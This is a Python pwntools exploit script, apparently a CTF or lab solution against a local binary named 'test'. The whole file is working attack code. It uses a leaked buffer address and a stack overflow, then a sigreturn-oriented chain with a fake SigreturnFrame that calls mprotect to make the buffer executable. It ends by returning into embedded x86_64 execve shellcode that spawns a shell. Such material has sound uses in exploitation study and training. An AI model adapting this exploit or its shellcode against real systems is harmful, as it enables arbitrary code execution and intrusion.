#!/usr/bin/python
from pwn import *

context.clear(arch="amd64")
pad = 120

# Gadget
syscall_ret = 0x000000000040053b
mov_rax_15_ret = 0x0000000000400545


c = process("./test")
c.recvuntil("@0x")
leak = int(c.recvuntil(",")[:-1], 16)
print "Buff @ " + hex(leak)
test = 0x601000 # TEST ADDRESS
pause() # STOP TO ATTACH GDB
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # x86_64 EXECVE SHELLCODE
# EXPLOIT
payload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF
payload = payload.ljust(pad, "A") # FILLING STACK TO SAVED RIP
payload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER
payload += p64(syscall_ret) # CALL SIGRETURN
# BUILD FAKE FRAME
frame = SigreturnFrame(kernel="amd64") # CREATING A SIGRETURN FRAME
frame.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER
frame.rdi = leak # SET RDI TO BUFF ADDRESS
frame.rsi = 2000 # SET RSI TO SIZE
frame.rdx = 7 # SET RDX => RWX PERMISSION
frame.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!
frame.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS
# PLACE FAKE FRAME ON STACK
payload += str(frame)
payload += p64(leak) # RETURN2SHELLCODE

c.sendline(payload)

c.interactive()
